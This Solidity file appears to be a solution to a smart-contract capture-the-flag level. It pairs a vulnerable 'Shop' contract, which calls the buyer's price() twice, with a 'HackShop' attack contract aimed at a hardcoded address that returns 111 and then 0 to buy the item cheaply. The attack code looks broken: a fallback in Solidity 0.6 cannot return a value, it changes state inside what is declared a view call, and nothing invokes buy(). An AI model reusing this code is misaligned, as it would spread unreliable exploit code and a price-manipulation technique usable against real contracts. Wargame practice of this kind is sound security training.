// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract HackShop {
    Shop public constant shop = Shop(0x55111a7DE5e0C79f21d30d610de0589E8CD020D9);
    bool public flag;

    fallback() external returns(uint) {
        if (!flag) {
            flag = true;
            return 111;
        } else {
            return 0;
        }
    }
}